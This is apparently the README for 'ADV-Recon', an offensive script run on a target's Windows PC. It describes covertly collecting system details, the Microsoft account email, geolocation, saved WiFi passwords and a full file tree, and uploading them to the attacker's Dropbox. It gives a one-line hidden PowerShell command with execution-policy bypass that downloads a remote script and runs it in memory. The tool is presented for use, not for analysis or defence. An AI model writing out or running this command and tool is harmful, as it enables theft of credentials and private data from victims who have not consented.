
# ADV-Recon

A script used to do an advanced level of Recon on the targets computer

## Description

This program enumerates a target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
The GeoLocation (latitude and longitude) of where the script was ran.
The SSID and WiFi password of any current or previously connected to networks.
It determines the last day they changed thier password and how many days ago.
Intel on the system Info, HDDs, network interfaces, TCP connections, Processes, Services, Installed software, drivers, and video card 
Along with TREE list of all files in the target computer is gathered and uploaded to your DropBox cloud storage

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11


### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```

